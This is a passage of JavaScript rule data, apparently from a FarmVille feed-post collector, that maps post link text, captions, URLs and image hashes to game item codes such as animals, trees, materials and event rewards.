					{search:["link","title","caption"],find:"surfboard",ret:"surfboard"},
					{search:["link","title","caption"],find:"giant maracija",ret:"giantmaracija"},
					{search:["link","title","caption"],find:"hydrangea",ret:"hydrangea"},
					{search:["link","title","caption"],find:"harbor seal",ret:"adopt_harborseal"},
					{search:["link","title","caption"],find:"postier brenton",ret:"adopt_horsepostierbrenton"},
					{search:["link","title","caption"],find:"ringtail",ret:"adopt_ringtail"},
					{search:["link","title","caption"],find:"sakura flower",ret:"sakuraflower"},
					{search:["link","title","caption"],find:"yellow dome",ret:"yellow dome"},
					{search:["link","title","caption"],find:"shamrock sheep",ret:"adopt_sheepshamrock"},
					{search:["link","title","caption"],find:"lilac tree",ret:"tree_lilac"},
					{search:["link","title","caption"],find:"blue-winged teal",ret:"adopt_bluewingedteal"},
					{search:["link","title","caption"],find:"japanese trellis",ret:"japanesetrellis"},
					{search:["link","title","caption"],find:"enchanted tree ii",ret:"enchantedtreeii"},
					{search:["link","title","caption"],find:"brachiosaurus",ret:"adopt_brachiosaurus"},
					{search:["link","title","caption"],find:"carnotaurus",ret:"adopt_carnotaurus"},
					{search:["link","title","caption"],find:"gallimimus",ret:"adopt_gallimimus"},
					{search:["link","title","caption"],find:"soho oriental poppy",ret:"bulb_sohoorientalpoppy"},
					{search:["link","title","caption"],find:"coelophysis",ret:"adopt_coelophysis"},
					{search:["link","title","caption"],find:"chinchilla",ret:"adopt_chinchilla"},
					{search:["link","title","caption"],find:"fairy rose",ret:"fairyrose"},
					{search:["link","title","caption"],find:"warrior i",ret:"warriori"},
					{search:["link","title","caption"],find:"rainbow barrel",ret:"rainbowbarrel"},
					{search:["link","title","caption"],find:"etterius dragon",ret:"adopt_etteriusdragon"},
					{search:["link","title","caption"],find:"tselius dragon",ret:"adopt_tseliusdragon"},
				]},
				
				{link:["claim it","claim prize","share prize","share it"],ret:"none",kids:[
				//	{search:["title","caption"],find:"{%1}",subTests:specialMaterials,ret:"none",kids:[
						{search:["title","caption"],find:"{%1} horse",subTests:horseTypes,ret:"adopt_horse{%1}"},
						{search:["title","caption"],find:"{%1} cow",subTests:cowTypes,ret:"adopt_cow{%1}"},
						{search:["title","caption"],find:"{%1} sheep",subTests:sheepTypes,ret:"adopt_sheep{%1}"},
						{search:["title","caption"],find:"{%1} ewe",subTests:sheepTypes,ret:"adopt_ewe{%1}"},
						{search:["title","caption"],find:"giant {%1}",subTests:treeTypes2,ret:"tree_giant{%1}"},
						{search:["title","caption"],find:"big {%1}",subTests:treeTypes2,ret:"tree_giant{%1}"},
						{search:["title","caption"],find:"{%1} bonsai ii",subTests:treeTypes3,ret:"tree_bonsai{%1}"},
						{search:["title","caption"],find:"{%1} tree",subTests:treeTypes,ret:"tree_{%1}"},
						{search:["title","caption"],find:"{%1} bulb",subTests:bulbTypes,ret:"bulb_{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:otherAnimals,ret:"adopt_{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:decorTypes,ret:"{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:otherConsumables,ret:"{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:specialEvents,ret:"{%1}"},
						{search:["title","caption"],find:"{%1}",subTests:specialMaterials,ret:"{%1}"},
				//	]},
				]},
				
				//charming vineyard event
				{link:"claim prize",ret:"none",kids:[
					{search:["title","caption"],find:"Connoisseur Sheep",ret:"adopt_sheepconnoisseur"},
					{search:["title","caption"],find:"Vintner Gnome",ret:"vintnergnome"},
					{search:["title","caption"],find:"Red Grape Rabbit",ret:"adopt_redgraperabbit"},
					{search:["title","caption"],find:"Grape Crushing Barrel",ret:"grapecrushingbarrel"},
					{search:["title","caption"],find:"Vineyard Steed",ret:"adopt_vineyardsteed"},
					{search:["title","caption"],find:"Valet Gnome",ret:"valetgnome"},
					{search:["title","caption"],find:"White Cypress Tree",ret:"tree_whitecypress"},
					{search:["title","caption"],find:"Oak Barrel Rack",ret:"oakbarrelrack"},
					{search:["title","caption"],find:"Chateau Stallion",ret:"adopt_chateaustallion"},
					{search:["title","caption"],find:"White Grape Duck",ret:"adopt_duckwhitegrape"},
					{search:["title","caption"],find:"Red Willow Tree",ret:"tree_redwillow"},
					{search:["title","caption"],find:"Gardener Chicken",ret:"adopt_gardenerchicken"},
					{search:["title","caption"],find:"Bird of Paradise",ret:"bulb_birdofparadise"},
				]},
				
				//mystery bulbs
				{link:"get flower",ret:"bulb_unknown",kids:[
					{link:"flower food",ret:"flowerfood"},
					{search:["title","caption"],find:"have a fully grown {%1}",subTests:bulbTypes,ret:"bulb_{%1}"},
					{search:["title","caption"],find:"now has a {%1} on their farm",subTests:bulbTypes,ret:"bulb_{%1}"},
					{search:["title","caption"],find:"has all the {%1} they need",subTests:"materials",ret:"{%1}"},
				]},
				
				//tests to distinguish between two types of baby blankets
				{img:"f265afa84c6a43bc616b151417058203",ret:"pinkbabyblanket"},
				{img:"9ec1a380594fa2c619e1ad18f28a048a",ret:"bluebabyblanket"},
				{search:["title","caption"],find:"baby blanket",ret:"none",kids:[
					{search:["title","caption"],find:"baby playpen",ret:"bluebabyblanket"},
					{search:["title","caption"],find:"baby nursery",ret:"pinkbabyblanket"},
				]},
				
				//specific text/url tests
				{url:"mystery_seeds_halfway",ret:"wateringcan"},
				{url:"mysterybaby_fullygrown",ret:"animalfeed"},
				{link:"gopher treat",ret:"gophertreat"},
				{link:"love potion",ret:"lovepotion"},
				{link:"pile on",ret:"sendhelp"},
				{search:["title","caption"],find:"needs some Chow to grow",ret:"pigchow"},
				{search:["title","caption"],find:"uncovered",ret:"none",kids:[
					{search:["title","caption"],find:"trapped in ice",ret:"mat_snowtreasure"},
					{search:["title","caption"],find:"trapped in a treasure",ret:"mat_hawaiiantreasure"},
					{search:["title","caption"],find:"hidden in a tomb",ret:"mat_tombtreasure"},
					{search:["title","caption"],find:"hidden in a treestump",ret:"mat_holidaytreasure"},
				]},
				{search:["title","caption"],find:["has rescued","troll's evil enchantment","leftover magical powers"],ret:"mat_trolltreasure"},
				{search:["title","caption"],find:"rainbow butterfly ii",ret:"tree_bonsairainbowbutterfly"},
				{link:"get material",ret:"none",kids:[{search:["title","caption"],find:"spooky home",ret:"sendhelp"},]},
				{link:"get some chow",ret:"pigchow"},
				{link:["decorate","let them know"],ret:"sendhelp"},
				{link:"collect 50 zp",ret:"zp"},
				{link:"collect 50 sp",ret:"sp"},
				{link:"collect 50 cp",ret:"cp"},
				{link:"collect 100 coconuts",ret:"coconuts"},
				{link:"give and get",ret:"none",kids:[
					{search:["title","caption"],find:"{%1}",subTests:materials,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:buildings,ret:"mat_{%1}"},
				]},
				{link:"accept and send",ret:"none",kids:[
					{search:["title","caption"],find:"{%1}",subTests:materials,ret:"{%1}"},
					{search:["title","caption"],find:"Pink Boat Orchid",ret:"bulb_pinkboatorchid"},
				]},
				{search:["title","caption"],find:["is asking their friends for","needs a few","looking for","is helping","send some","to help","they're sharing","needs"],ret:"none",kids:[
					{link:["send","give","help"],ret:"sendhelp"},
					{link:"get",ret:"none",kids:[{search:["title","caption"],find:["asking their friends","sharing","needs a few","looking for","helping","needs"],ret:"sendhelp"},]},
					{link:"adopt",ret:"none"},
				]},
				{search:["title","caption"],find:["is sharing extra","is sharing"],ret:"none",kids:[
					{link:["send materials","send building parts","send parts"],ret:"sendmat"},
					{search:["title","caption"],find:"is sharing a free {%1}",subTests:materials,ret:"{%1}"},
					{link:["send","help"],ret:"sendhelp"},
					{link:"get {%1}",subTests:materials,ret:"{%1}"},
					{title:"{%1}",subTests:materials,ret:"{%1}"},
				]},
				{link:"adopt turtle",ret:"adopt_turtle",kids:[
					{search:["title","caption"],find:"bred a new baby turtle in their Turtle Pen",ret:"adopt_babyturtle"},
				]},
				{link:"get vial",ret:"sendsnoozepollen"},
				{link:"send mallet",ret:"mallet"},
				{link:"send wheelbarrow",ret:"wheelbarrow"},
				{link:"treasure pick",ret:"sendtreasurepick"},
				{link:"get outfit",ret:"sendmascotoutfit"},
				{search:["title","caption"],find:"is collecting Dream Drop for their Dream Tree",ret:"dreamdrop"},
				{url:"animal_mastery",ret:"animalfeed"},
				{url:"crop_mastery",ret:"coins"},
				{both:"turbo",ret:"turbocharge"},
				{both:"mystery dart",ret:"mysterygamedart"},
				{search:["title","caption"],find:"whisperer",ret:"animalfeed"},
				{link:["get a bonus from them","Get a Job reward!"],ret:"coins"},
				{link:"get rewards",ret:"none",kids:[{search:["title","caption"],find:"leaderboard",ret:"coins"},]},
				{url:["AchievementFriendReward","MasteryFriendReward","FertilizeThankFriendReward"], ret:"coins"},
				{search:["title","caption"],find:"Refree Calf",ret:"adopt_calfreferee"},
				{search:["title","caption"],find:"needs your help in the Craftshop!",ret:"bushel_random"},
				{search:["title","caption"],find:"is hosting a barn raising", ret:"sendhelp"},
				{search:["title","caption"],find:"needs more Turkeys for their Turkey Roost", ret:"sendturkey"},
				{search:["title","caption"],find:"ram up for adopt", ret:"adopt_lambram"},
				{search:["title","caption"],find:"ewe up for adopt", ret:"adopt_lambewe"},
				{link:"adopt {%1}", subTests:["piglet","lamb"], ret:"adopt_{%1}"},
				{search:["title","caption"],find:"wandering stallion", ret:"wanderingstallion"},
				{search:["title","caption"],find:["helped find a lost rabbit","is helping the bunnies"], ret:"adopt_rabbit"},
				{search:["title","caption"],find:"yellow cattle", ret:"adopt_calfgelbvieh"},
				{search:["title","caption"],find:"has finished work on their Turtle Pen",ret:"adopt_navyfuschiaspottedturtle"},
				{search:["title","caption"],find:"finished building their Zoo", ret:"adopt_babyelephant"},
				{search:["title","caption"],find:"share this Black Tabby Cat", ret:"adopt_blackkitten"},
				{search:["title","caption"],find:"has a free Himalayan Cat", ret:"adopt_himalayankitty"},
				{search:["title","caption"],find:"has a free Dwarf Blue Sheep",ret:"adopt_sheepdwarfblue"},
				{search:["title","caption"],find:"finished building their Wildlife Habitat", ret:"adopt_porcupine"},
				{search:["title","caption"],find:"has completed a Maison", ret:"provencalpot"},
				{search:["title","caption"],find:"has completed their Botanical Garden", ret:"hangingflowers"},
				{search:["title","caption"],find:"has completed their Japanese Barn", ret:"japanesetrellis"},
				{search:["title","caption"],find:"has finished expanding their Nursery Barn", ret:"adopt_calfbaby"},
				{search:["title","caption"],find:["has built a Horse Stable","has finished expanding their horse stable"], ret:"adopt_horsebrown"},
				{search:["title","caption"],find:"just finished building their Sheep Pen", ret:"adopt_ram"},
				{search:["title","caption"],find:"just finished building their Aviary", ret:"adopt_farmgoose"},
				{search:["title","caption"],find:"finished work on their Winter Livestock Pen",ret:"adopt_pigsnowflake"},
				{search:["title","caption"],find:"has a free Red Goat that they want to share", ret:"adopt_redgoat"},
				{search:["title","caption"],find:"finished building their Cow Pasture",ret:"adopt_cowirishmoiled"},
				{search:["title","caption"],find:"finished building their Horse Paddock",ret:"adopt_horsecreamdraft"},
				{search:["title","caption"],find:"has built a Nursery Barn in FarmVille",ret:"adopt_foalgrey"},
				{search:["title","caption"],find:"just finished building their Baby Playpen",ret:"adopt_foalclydesdale"},
				{search:["title","caption"],find:["just finished building their Winter Pet Run","Holiday St. Bernard"],ret:"adopt_holidaystbernard"},
				{search:["title","caption"],find:"has a free Big Blue Tang Fish",ret:"adopt_bigbluetangfish"},
				{search:["title","caption"],find:"has a free Treasure Seagull",ret:"adopt_treasureseagull"},
				{search:["title","caption"],find:"has a free Striped Possum",ret:"adopt_stripedpossum"},
				{search:["title","caption"],find:"has a free Lesser Flamingo",ret:"adopt_lesserflamingo"},
				{search:["title","caption"],find:"has a free Black Horse",ret:"adopt_horseblack"},
				{search:["title","caption"],find:"has a free White Pig",ret:"adopt_pigwhite"},
				{search:["title","caption"],find:"has a free Red Cow",ret:"adopt_cowred"},
				{search:["title","caption"],find:["has finished work on their Winter Zoo","Snow Leopard"],ret:"adopt_snowleopard"},
				{search:["title","caption"],find:"finished building their Baby Bunny Hutch",ret:"adopt_whitedaisybunny"},
				{link:"longtail duck", ret: "adopt_ducklongtail"},
				{search:["title","caption"],find:"just completed this week's raffle and has extra tickets for you!",ret:"raffleticket"},
				{search:["title","caption"],find:"Ram (Flowered Green)",ret:"adopt_ramfloweredgreen"},
				{search:["title","caption"],find:"Flowered Horse",ret:"adopt_horseflowered"},
				{search:["title","caption"],find:"was able to get {%1}", subTests:["arborist","farmhand","100 xp"], ret:"{%1}"},
				{search:["title","caption"],find:"of the following items: {%1}", subTests:[].concat(decorTypes,materials,otherWords).fixOrder(), ret:"{%1}"},
				{link:"claim",ret:"none",kids:[{search:["title","caption"],find:"of the following items: {%1}",subTests:["moon","shamrock","horseshoe"],ret:"luckycharms"},]},
				{search:["title","caption"],find:"is farming with fewer clicks", ret:"vehiclepart"},
				{search:["title","caption"],find:"special Greenhouse crops and just surpassed", ret:"specialdelivery"},
				{search:["title","caption"],find:"is harvesting cross-bred crops", ret:"treehouse"},
				{search:["title","caption"],find:"found some mixed bouquets", ret:"flowerbouquet"},
				{search:["title","caption"],find:"has some Flowers to share", ret:"flowers"},
				{caption:"your crops are no longer withered", ret:"fuel"},
				{search:["title","caption"],find:"is entered in a Sweepstakes to win a trip to England", ret:"postcard"},
				{search:["title","caption"],find:"is getting ready for the Village Faire", ret:"tree_lemon"},
				{search:["title","caption"],find:"just sent you an extra special present", ret:"present"},
				{search:["title","caption"],find:["Just click below to collect it!","Here's a little something you might find useful!"], ret:"grabbag"},
				{search:["title","caption"],find:"celebration by claiming Animal Feed",ret:"animalfeed"},
				{search:["title","caption"],find:"sharing the Milking Shorthorn",ret:"adopt_cowmilkingshorthorn"},
				{search:["title","caption"],find:"decorating their farm with a wonderful",ret:"none",kids:[
					{search:["title","caption"],find:"{%1} of their own creation",subTests:["shack","house","cottage","villa","mansion"],ret:"mat_dreamhouse"},
				]},
				{search:["title","caption"],find:"started working on their {%1}",subTests:buildings,ret:"mat_{%1}"},
				{link:"claim pink gladiolas",ret:"bulb_pinkgladiolas"},
				{link:"help out",ret:"sendhelp"},
				{link:"reward",ret:"coins"},
				{link:["get a goo","claim goo"],ret:"goo"},
				{search:["title","caption"],find:["found some treats","is giving away treats"],ret:"treats"},
				{link:["spooky bat","get spider","claim spider","vampire teeth","ghost cupcake","carmel apple","pumpkin lollipop"],ret:"treats"},
				{link:["wieners","weiners","s'more","kindling","matches","plaid blanket","lumber"],ret:"bonfiresupplies"},
			//	{link:["magic snowflake","magic top hat","shooting star","mound of snow","aurora dust","starry scarf"],ret:"snowmanparts"},
				{search:["link","title","caption"],find:["love bow","wings","love arrow","cupid's bow"],ret:"tokenofaffection"},
				{link:"apple barrel",ret:"applebarrel"},
				{link:"apple wood basket",ret:"applewoodbasket"},
				{link:"get apple core",ret:"sendapplecore"},
				{link:"get apple",ret:"apple"},
				{link:["get a trick",],ret:"tricks"},
				{link:["get rope","claim rope"],ret:"rope"},
				{link:"send lemon",ret:"sendlemon"},
				{link:"get lemon basket",ret:"lemonbasket"},
				{link:"raffle ticket",ret:"raffleticket"},
				{link:["send tarot card","get tarot card"],ret:"tarotcard",kids:[
					{img:"2b57851ff624d149c87d1d6fb253d664",ret:"tarot_past"},
					{img:"cc090175c5492de0bee2b63dc929903c",ret:"tarot_present"},
					{img:"cefe00adfdac7973a6a515193f466b68",ret:"tarot_future"},
				]},
				{link:["get saddle","claim saddle"],ret:"saddle"},
				{search:["title","caption"],find:"is done collecting all the Saddle",ret:"saddle"},
				{link:"adopt saddle foal",ret:"adopt_foalsaddle"},
				{search:["title","caption"],find:"found an adorable Saddle foal",ret:"adopt_foalsaddle"},
				{search:["title","caption"],find:"found a Firefly Horse while harvseting the Baby Playpen",ret:"adopt_horsefirefly"},
				{search:["title","caption"],find:"just found a  Baby while harvesting the Spooky Paddock",ret:"adopt_foalspooky"},
				{search:["title","caption"],find:"just found a  Baby while harvesting the Haunted Pasture",ret:"adopt_calfspooky"},
				{search:["title","caption"],find:"just found a  Baby while harvesting the Joyful Horse Paddock",ret:"adopt_foaljoyful"},
				{search:["title","caption"],find:"just found a  Baby while harvesting the Glen Paddock",ret:"adopt_foalglen"},
				{search:["title","caption"],find:["Bamboo Fortune"],ret:"smallaxe"},
				{search:["title","caption"],find:["Stone Fortune"],ret:"wheelbarrow"},
				{search:["title","caption"],find:["Water Fortune"],ret:"boathook"},
				{url:"BambooTreasure",ret:"smallaxe"},
				{url:"RockTreasure",ret:"wheelbarrow"},
				{url:"WaterBottleTreasure",ret:"boathook"},
				{url:"WaterTreasure",ret:"smallfishingnet"},
				{search:["title","caption"],find:["Extra Large Buried Treasure","Large Buried Treasure"],ret:"largecrowbar"},
				{search:["title","caption"],find:["Medium Buried Treasure","Small Buried Treasure"],ret:"smallcrowbar"},
				{search:["title","caption"],find:["Extra Large Sea Treasure","Large Sea Treasure"],ret:"largefishingnet"},
				{search:["title","caption"],find:["Medium Sea Treasure","Small Sea Treasure"],ret:"smallfishingnet"},
				{search:["title","caption"],find:["Extra Large Snow Treasure","Large Snow Treasure"],ret:"pickaxe"},
				{search:["title","caption"],find:["Medium Snow Treasure","Small Snow Treasure"],ret:"hairdryer"},
				{search:["title","caption"],find:["Medium Tomb","Small Tomb"],ret:"stonepick"},
				{search:["title","caption"],find:["Extra Large Tomb","Large Tomb"],ret:"mallet"},
				{search:["title","caption"],find:["Extra Large Treestump","Medium Treestump"],ret:"powersaw"},
				{search:["title","caption"],find:["Large Treestump","Small Treestump"],ret:"lumberjacksaw"},
				{search:["title","caption"],find:["Extra Large Troll","Large Troll"],ret:"magicmushroom"},
				{search:["title","caption"],find:["Medium Troll","Small Troll"],ret:"vialofsunlight"},
				{search:["title","caption"],find:"has finished building an Grove",ret:"mat_grove"},
				{link:["get materials","get extra materials"],ret:"none",kids:[{search:["title","caption"],find:"{%1}",subTests:buildings,ret:"mat_{%1}"},]},
				//{link:"get {%1}",subTests:otherConsumables,ret:"{%1}"},
				{link:"screwdriver",ret:"screwdriver"},
				{search:["title","caption"],find:"is done collecting all the Screwdriver",ret:"screwdriver"},
				{search:["title","caption"],find:"grew up into a Cow in their Nursery Barn",ret:"adopt_calfbaby"},
				{search:["title","caption"],find:["supplies and just surpassed","is stocking their Harvest Bonfire with supplies","to help stock their friends' Harvest Bonfires!"], ret:"bonfiresupplies"},
				{link:["get log","claim log"],ret:"log"},
				{link:"send fire log",ret:"sendfirelog"},
				{search:["title","caption"],find:"pink patch calf bull",ret:"adopt_calfpinkpatchbull"},
				{link:"holiday gift",ret:"holidaygifts"},
				{img:"58fc1d30b0a983020037300f97eb8a51",ret:"adopt_calfbull"},
				{search:["title","caption"],find:["found an adorable calf","found a Calf"],ret:"adopt_calfbaby"},
				{search:["title","caption"],find:"filled their Holiday Tree to earn a special gift",ret:"holidaygifts"},
				{link:"north-polarized goggles",ret:"sendpolarizedgoggles"},
				{link:"get one",ret:"none",kids:[
					{search:["title","caption"],find:"Magic Snowman",ret:"snowmanparts"},
					{search:["title","caption"],find:"sharing a few presents to fill up your Holiday Tree",ret:"holidaygifts"},
				]},
				{link:"vote now",ret:"none",kids:[
					{search:["title","caption"],find:"naughty or nice",ret:"stockingstuffer"},
					{search:["title","caption"],find:"ideal vacation",ret:"dreamvacation"},
					{search:["title","caption"],find:"perfect pet",ret:"perfectpet"},
					{search:["title","caption"],find:"charming vineyard",ret:"charmingvineyard"},
					{search:["title","caption"],find:"statue",ret:"statue"},
					{search:["title","caption"],find:"perfect job",ret:"perfectjob"},
				]},
				{img:"39e49b2e0b1035f67ae8cca0ae1b72c2",ret:"egg_egginjeans"},
				{img:"e3593e5c7c796def3e734cdc82e3b854",ret:"sendwarmthermos"},
				{img:"252a7c266ba8f9274db69e6b77d610a1",ret:"sendwinterchili"},
				{link:"claim {%1}",subTests:["goo","sack","scoop","belt"],ret:"{%1}"},
				{link:"become a judge",ret:"sendjudge"},
				{search:["title","caption"],find:"Romatic Carriage",ret:"mat_romanticcarriage"},
				{link:"get",ret:"none",kids:[{search:["title","caption"],find:"{%1}",subTests:craftingMaterials,ret:"{%1}"},]},
				{link:"adopt grass pony",ret:"adopt_foalgrasspony"},
				{link:"get trinket",ret:"sendbabydolltrinket"},
				{link:"diamond ewe",ret:"adopt_diamondewe"},
				{link:"bring on the lava",ret:"mat_volcanoreef"},
				{link:"pick axe",ret:"pickaxe"},
				{link:["shamrock","moon","horseshoe"],ret:"none",kids:[{search:["title","caption"],find:"Lucky Rainbow",ret:"luckycharms"},]},
				{search:["title","caption"],find:"thrilled with the Lighted Tiki Torch",ret:"lightedtikitorch"},
				{link:"build a volcano",ret:"mat_volcanoreef"},
				{link:"get feed",ret:"animalfeed"},
				{search:["link","title","caption"],find:["double avatar","2x avatar"],ret:"doubleavatar"},
				{search:["title","caption"],find:"care package",ret:"carepackage"},
				{img:["f0b0589808ceddd836deef88f4235402","c4e6e4f5633662470d91c75a8e682feb","80bb93b0b14050bc2db9e47877a0a274","addc3659c1e10368ae062c0a8358b281"],ret:"mat_hawaiiantreasure"},
				{url:"petrun_baby_common",ret:"petrun_common"},
				{url:"petrun_baby_rare",ret:"petrun_rare"},
				{url:"wildlife_baby_common",ret:"wildlife_common"},
				{url:"wildlife_baby_rare",ret:"wildlife_rare"},
				{url:"livestock_baby_common",ret:"livestock_common"},
				{url:"livestock_baby_rare",ret:"livestock_rare"},
				{url:"zoo_baby_common",ret:"zoo_common"},
				{url:"zoo_baby_rare",ret:"zoo_rare"},
				{url:"aviary_baby_common",ret:"aviary_common"},
				{url:"aviary_baby_rare",ret:"aviary_rare"},
				{url:"arctic_baby_common",ret:"arctic_common"},
				{url:"arctic_baby_rare",ret:"arctic_rare"},
				{url:["xhibabybasketcommonfloaty","swimhole_baby_common"],ret:"sea_common"},
				{url:["xhibabybasketrarefloaty","swimhole_baby_rare"],ret:"sea_rare"},
				{url:"xas_babybasketcommonfloaty",ret:"jade_common"},
				{url:"xas_babybasketrarefloaty",ret:"jade_rare"},
				{search:["title","caption"],find:"is sharing a free Hopper from DISH and wants you to have one",ret:"adopt_hopperfromdish"},
				{url:"xhi_reef_expansionComplete",ret:"mat_volcanoreef"},
				{img:"b5ef8d15cd6eb476b86ddc660476c04a",ret:"mat_snowtreasure"},
				{search:["title","caption"],find:"wooden plank",ret:"woodplank"},
				//{url:"fuel",ret:"fuel"},
				{desc:"coins",ret:"{%1}"},
				//{link:"get {%1}",subTests:materials,ret:"{%1}"},
				{link:["help and get","get"],ret:"none",kids:[
					{search:["title","caption"],find:["April Showers","Mother's Day"],ret:"sendhelp"},
				]},
				{title:"finished building an {%1}",subTests:buildings,ret:"mat_{%1}"},
				{title:"is working hard on an {%1}",subTests:buildings,ret:"mat_{%1}"},
				{title:"is working hard on a {%1}",subTests:buildings,ret:"mat_{%1}"},
				{search:["title","caption"],find:"building",ret:"none",kids:[
					{search:["title","caption"],find:"gigantic {%1}",subTests:buildings,ret:"mat_{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:buildings,ret:"mat_{%1}"},
				]},
				{search:["title","caption"],find:"has extra parts",ret:"none",kids:[{search:["title","caption"],find:"{%1}",subTests:materials,ret:"{%1}"},]},
				{search:["title","caption"],find:"is giving away extra {%1}",subTests:materials,ret:"{%1}"},
				{title:"has an extra {%1}",subTests:materials,ret:"{%1}"},
				{link:["get one","some","bonus","get gift"],ret:"none",kids:[
					{search:["title","caption"],find:"coins",ret:"coins"},
					{search:["title","caption"],find:"flame pepper seeds",ret:"seeds_flamepepper"},
					{search:["title","caption"],find:"goos",ret:"goo"},
					{search:["title","caption"],find:"found some {%1} ",subTests:standardMaterials,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:specialEvents,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:otherConsumables,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:standardMaterials,ret:"{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:specialMaterials,ret:"{%1}"},
					{search:["title","caption"],find:["big picnic","picnic basket"],ret:"picnicbasket"},
					{search:["title","caption"],find:["ice cream","giant sundae"],ret:"icecream"},
					{search:["title","caption"],find:"magic snowflake",ret:"snowmanparts"},
					{search:["title","caption"],find:"holiday gift",ret:"holidaygifts"},
					{search:["title","caption"],find:"stocking stuffer",ret:"stockingstuffer"},
					{search:["title","caption"],find:["cupid bow","pair of wings","love arrow"],ret:"tokenofaffection"},
					{search:["title","caption"],find:["shamrock","moon","horseshoe"],ret:"luckycharms"},
					{search:["title","caption"],find:"shovels",ret:"shovel"},
				]},
				{title:"has built their {%1}",subTests:buildings,ret:"mat_{%1}"},
				{title:"just found a",ret:"none",kids:[
					{search:["title","caption"],find:"{%1} foal",subTests:allFoals,ret:"adopt_foal{%1}"},
					{search:["title","caption"],find:"{%1} calf",subTests:allCalves,ret:"adopt_calf{%1}"},
					{search:["title","caption"],find:"{%1} yak",subTests:yakTypes,ret:"adopt_yak{%1}"},
					{search:["title","caption"],find:"{%1}",subTests:babyAnimals,ret:"adopt_{%1}"},
				]},
				{link:"help and get one",ret:"sendhelp"},
				{link:"Get the Tiki Torch",ret:"lightedtikitorch"},
				{search:["title","caption"],find:"Big Candy Pumpkin",ret:"tree_giantcandypumpkin"},
				
				{search:["title","caption"],find:"avatar costume",ret:"costume",kids:[
						//static-0.farmville.zgncdn.com/assets/hashed/
						{img:"2613b0e7b51fa559642d5327264ae88b",ret:"costume_pamperedprincess"},
						{img:"6d5a278f8928c05128e09249dbfe4067",ret:"costume_sensiblesunbather"},
						{img:"6253bd20890c5c174a0df5f17d10086c",ret:"costume_casualtraveler"},
						{img:"de8a7457788f439dc31e8d74e51de514",ret:"costume_practicallounger"},
						{img:"2e108b39b850a1af884c6109edd56cd0",ret:"costume_outdoorexplorer"},
						{img:"096da69403ca8a64c202f38611968c76",ret:"costume_spontaneousadventurer"},
						{img:"cfe6812589f5c77091865ecfb30b84f0",ret:"costume_wildspirit"},
						{img:"eb4b576243d01a47d47478515b739ca9",ret:"costume_teddybear"},
						{img:"d89b62ce659649a17a200be6c9ca7289",ret:"costume_koala"},
						{img:"bb6ccdfef16d514c5adecf18a8f6075f",ret:"costume_cat"},
						{img:"27de181336b60fc59a8363e97a902441",ret:"costume_hamster"},
						{img:"0e9c8baa8aaa9ef595814d1c036d0b70",ret:"costume_dog"},
						{img:"dd2e0af021c9030c80f398a584fbf157",ret:"costume_monkey"},
						{img:"8dba7c7b5286c06a71961d6f35a3a8e7",ret:"costume_lion"},
						{img:"d398f39aa59eb5633480844fffdf9db6",ret:"costume_tiger"},
						{search:["title","caption"],find:"{%1}",subTests:avatar,ret:"{%1}"},
				]},
				
				{link:"claim it",ret:"none",kids:[
					{img:"2057bb48e6218f7872275a5f598f3dbe",ret:"tree_giantpoinsettia"},
					{img:"1daac2a32f3cff1e9d1e6be36d1ccb00",ret:"snowdrift"},
					{img:"f0bb0874eebe3f8b82f2cfa08fbaf7d2",ret:"horsesnowglobe"},
					{img:"a1fba272cce026483331d5a3b51da743",ret:"lightedhedge"},
					{img:"9ef18f3747eaedc97e8b12ded42ff7b9",ret:"carolingsnowman"},
					{img:"2d0fb731d3219e543b031dbd6ed17062",ret:"teddybearsnowglobe"},
					{img:"386facd490ae76cf31876845a0893ab7",ret:"adopt_carolinggoat"},
					{img:"afa8195c0a7a49514464a45faa1b6132",ret:"luminaryfence"},
					{img:"c27998b5e780e9363db27db71a10c73d",ret:"coal"},
					{img:"b42c0a157197ceb896afe22ec4c0e48f",ret:"animalfeed"},
					{img:"417d2412991bdc6c5941e876b617071f",ret:"railspike"},
					{img:"77bc73ef224bd9b0bd70e53a51c11d47",ret:"railtie"},
					{img:"18bb508499a8369017208586170d3cf0",ret:"wateringcan"},
					{img:"890e543735401b5e5325d214805aa029",ret:"arborist"},
					{img:"4b8cc80501cc6d433b47b19bf3512337",ret:"farmhand"},
					{img:"83162ebbc9e06677ef8121ef01906efe",ret:"fertilizeall"},
					{img:"eba8a91b33b34f0f6505aad21a367990",ret:"frozenfountain"},
					{img:"0e79859e7349415c5592bbc9bd9b1d58",ret:"log"},
					{img:"b2144f972c0354950e7633b4bc3bc20a",ret:"stone"},
					{img:"669e1eb90c73dfcc6342375aa2db67a1",ret:"steelbeam"},
					{img:"3744842e1fd51242cc9b7c0da72f212e",ret:"hairdryer"},
					{img:"aad46346769a3e818e5b3d233dc1443c",ret:"pickaxe"},
					{img:"faf5bc0d1a4fef592f4b47b25ccc5196",ret:"stringlights"},
					{img:"9db417e17c47331f0175b7abc0116838",ret:"hollyfence"},
					{img:"cc77d40e3812adc785bfcdd2b2ff007d",ret:"giantcandy"},
					{search:["title","caption"],find:"Giant Cupid Tree",ret:"tree_giantcupid"},
					{search:["title","caption"],find:"Nomadic Horse",ret:"adopt_horsenomadic"},
				]},
					
				{search:["title","caption"],find:"making good progress",ret:"none",kids:[
					{img:"f77442b5256ee2bf9374ea0572441f0a",ret:"holidaylights"},
					{img:"31a21629cef1a7ee9d048fbdcdd2300d",ret:"silverbell"},
					{img:"27a8b5c7730f0aff50da3aeca3e21a56",ret:"gps"},
					{img:"69f5031238453052f285d00d1538a9ca",ret:"snowflake"},
					{img:"2b2e8ba2c576a3a672d5d440e9e58cde",ret:"snowbrick"},
					{img:"cae16ae007e478c63228b8a3198bf1a2",ret:"icenail"},
					{img:"e2938eba8c6400466b0f5fd1d51ee504",ret:"snowglobe"},
					{img:"f360c4422127142e7d441b7c01a3495b",ret:"frozenbeam"},
					{img:"88e8dfabdd00d14cf62fbeae6a8f24e8",ret:"iceboard"},
				]},
				
				//search icon images to distinguish trees with same body texts
				{link:["get","tree"],ret:"none",kids:[
					{img:"91d2b7a356d56c78d400b765f4539aed",ret:"tree_giantgemii"},
